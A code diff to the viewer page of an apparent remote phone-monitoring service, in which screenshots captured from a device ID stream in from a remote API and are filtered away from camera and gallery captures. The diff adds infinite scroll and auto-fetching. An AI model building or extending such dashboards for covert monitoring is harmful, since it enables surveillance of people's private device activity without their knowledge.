@@ -16,8 +16,6 @@
         /* TABS */
         .tabs-container { display: flex; gap: 15px; margin-bottom: 25px; background: rgba(255,255,255,0.05); padding: 8px; border-radius: 15px; }
         .tab-btn { flex: 1; padding: 12px; border: none; background: transparent; color: #666; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; border-radius: 10px; transition: 0.3s; }
-        
-        /* Active Tab Style */
         .tab-btn.active { background: rgba(0, 243, 255, 0.15); color: #00f3ff; border: 1px solid #00f3ff; }
         .tab-btn.inactive:hover { background: rgba(255,255,255,0.1); color: #fff; }
 
@@ -31,7 +29,9 @@
         .loader { border: 3px solid #333; border-top: 3px solid #00f3ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .status-msg { text-align: center; color: #666; margin-top: 50px; }
-        .load-more-btn { background: #333; color: #fff; border: 1px solid #555; padding: 10px 25px; border-radius: 20px; display: block; margin: 20px auto; cursor: pointer; }
+        
+        /* Loading Text for Bottom */
+        .bottom-loader { text-align: center; padding: 20px; color: #888; font-size: 0.8rem; display: none; }
 
         /* MODAL */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
@@ -58,9 +58,14 @@
     </div>
 
     <div id="loading" class="loader"></div>
+    
     <div id="emptyState" class="status-msg" style="display: none;">No Screenshots found.</div>
+    
     <div class="gallery-container" id="galleryGrid"></div>
-    <button id="loadMoreBtn" class="load-more-btn" onclick="fetchNextPage()" style="display: none;">Load More</button>
+    
+    <div id="bottomLoader" class="bottom-loader">
+        <i class="fa-solid fa-circle-notch fa-spin"></i> Loading more...
+    </div>
 
     <div id="imageModal" class="modal" onclick="if(event.target === this) closeModal()">
         <img id="fullImage" src="">
@@ -74,9 +79,14 @@
         const API_BASE = 'https://child-v9no.onrender.com'; 
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');
+        
         let allFilesData = [];
         let nextCursor = null;
         let isLoading = false;
+        
+        // Kitne screenshot screen pe hone chahiye tab loading rukegi
+        const MIN_ITEMS_TO_SHOW = 10; 
+
         const socket = io(API_BASE, { transports: ['websocket', 'polling'] });
 
         function navigateTo(page) {
@@ -88,74 +98,106 @@
             if(!DEVICE_ID) return alert("Device ID Missing!");
             fetchFiles(true);
             
+            // Socket Realtime Update
             socket.on('new-file', (data) => {
                 if (data.device_id === DEVICE_ID) {
                     let u = data.url.toLowerCase();
-                    // 🔥 NEW LOGIC: Only allow if 'screen' or 'shot' is in name AND 'gallery' is NOT in name
-                    let isScreen = (u.includes('screen') || u.includes('shot')) && !u.includes('gallery');
-                    
-                    if(isScreen) {
+                    if((u.includes('screen') || u.includes('shot')) && !u.includes('gallery')) {
                         if(!allFilesData.includes(data.url)) {
                             allFilesData.unshift(data.url);
-                            renderGallery();
+                            renderGallery(false); // Render without hiding loader if running
                         }
                     }
                 }
             });
         };
 
+        // 🔥 INFINITE SCROLL LOGIC
+        window.onscroll = function() {
+            // Agar banda page ke bottom ke pass pahunch gaya
+            if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 300) {
+                if(nextCursor && !isLoading) {
+                    document.getElementById('bottomLoader').style.display = 'block';
+                    fetchFiles(false);
+                }
+            }
+        };
+
         function fetchFiles(isReset = false) {
             if (isLoading) return;
             isLoading = true;
-            document.getElementById('loading').style.display = isReset ? 'block' : 'none';
+
+            // Sirf shuru mein bada loader dikhao
+            if(isReset) document.getElementById('loading').style.display = 'block';
 
             let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}?limit=50`; 
             if (nextCursor && !isReset) url += `&next_cursor=${nextCursor}`;
 
             fetch(url).then(res => res.json()).then(data => {
-                document.getElementById('loading').style.display = 'none';
-                isLoading = false;
-                
                 let newFiles = data.photos || [];
-                nextCursor = data.next_cursor || null;
-                document.getElementById('loadMoreBtn').style.display = nextCursor ? 'block' : 'none';
+                
+                // Cursor Update
+                if (data.next_cursor) nextCursor = data.next_cursor;
+                else nextCursor = null;
 
+                // Data Append
                 if(isReset) allFilesData = newFiles;
                 else allFilesData = [...allFilesData, ...newFiles];
 
-                renderGallery();
-            }).catch(e => console.error(e));
+                // 🔥 AUTO-FETCH CHECK
+                // Check karo abhi tak kitne valid Screenshot mile hain
+                const validScreenshots = allFilesData.filter(isScreenshot);
+
+                if (validScreenshots.length < MIN_ITEMS_TO_SHOW && nextCursor) {
+                    // Agar abhi bhi kam photos hain, to turant agli batch mangao (User ko wait mat karao)
+                    isLoading = false; // Flag reset for recursion
+                    fetchFiles(false);
+                } else {
+                    // Kaafi photos mil gayi, ab render karo aur loader chupao
+                    renderGallery();
+                    isLoading = false;
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('bottomLoader').style.display = 'none';
+                }
+
+            }).catch(e => {
+                console.error(e);
+                isLoading = false;
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('bottomLoader').style.display = 'none';
+            });
         }
 
-        function fetchNextPage() { if(nextCursor) fetchFiles(false); }
+        // Helper: Check if URL is Screenshot
+        function isScreenshot(url) {
+            let u = url.toLowerCase();
+            if (u.includes('gallery')) return false; // Gallery hatao
+            if (u.includes('cam') || u.includes('front') || u.includes('back')) return false; // Camera hatao
+            return u.includes('screen') || u.includes('shot'); // Sirf Screenshot
+        }
 
         function renderGallery() {
             const grid = document.getElementById('galleryGrid');
-            grid.innerHTML = '';
-            
-            // 🔥 STRICT FILTER: Sirf Screenshot
-            const filtered = allFilesData.filter(url => {
-                let u = url.toLowerCase();
-                
-                // 1. Agar 'gallery' likha hai, to hata do (FALSE)
-                if (u.includes('gallery')) return false;
+            const filtered = allFilesData.filter(isScreenshot);
 
-                // 2. Agar 'cam', 'front', 'back' hai, to hata do (FALSE)
-                if (u.includes('cam') || u.includes('front') || u.includes('back')) return false;
+            grid.innerHTML = ''; // Clear grid
 
-                // 3. Agar 'screen' ya 'shot' hai tabhi dikhao (TRUE)
-                return u.includes('screen') || u.includes('shot');
-            });
-
-            if(filtered.length === 0) document.getElementById('emptyState').style.display = 'block';
-            else document.getElementById('emptyState').style.display = 'none';
+            if(filtered.length === 0) {
+                // Agar sab kuch load hone ke baad bhi 0 hai
+                if(!isLoading) document.getElementById('emptyState').style.display = 'block';
+            } else {
+                document.getElementById('emptyState').style.display = 'none';
+            }
 
             filtered.forEach(url => {
-                grid.innerHTML += `
-                    <div class="img-card" onclick="openModal('${url}')">
-                        <img src="${url}" loading="lazy">
-                        <div class="source-badge">Screenshot</div>
-                    </div>`;
+                const div = document.createElement('div');
+                div.className = 'img-card';
+                div.onclick = () => openModal(url);
+                div.innerHTML = `
+                    <img src="${url}" loading="lazy">
+                    <div class="source-badge">Screenshot</div>
+                `;
+                grid.appendChild(div);
             });
         }
 
